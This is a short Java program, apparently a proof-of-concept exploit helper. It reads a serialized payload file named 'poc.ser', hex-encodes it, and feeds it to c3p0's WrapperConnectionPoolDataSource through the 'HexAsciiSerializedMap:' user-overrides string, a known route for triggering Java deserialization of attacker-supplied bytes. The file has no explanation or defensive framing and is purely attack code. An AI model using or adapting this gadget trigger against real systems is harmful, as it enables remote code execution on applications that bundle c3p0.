import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;

import java.io.*;

public class HexBase {
    public static void main(String[] args) throws Exception {
        FileInputStream fis = new FileInputStream("poc.ser");
        byte[] classBytes = new byte[fis.available()];
        fis.read(classBytes);
        fis.close();

        StringBuffer sb = new StringBuffer(classBytes.length);
        for (int i = 0; i < classBytes.length; ++i) {
            String s = Integer.toHexString(255 & classBytes[i]);
            if (s.length() < 2) {
                sb.append(0);
            }
            sb.append(s.toUpperCase());
        }
        String hexString = sb.toString();
        WrapperConnectionPoolDataSource wrapperConnectionPoolDataSource = new WrapperConnectionPoolDataSource();
        wrapperConnectionPoolDataSource.setUserOverridesAsString("HexAsciiSerializedMap:" + hexString + "p");
    }
}
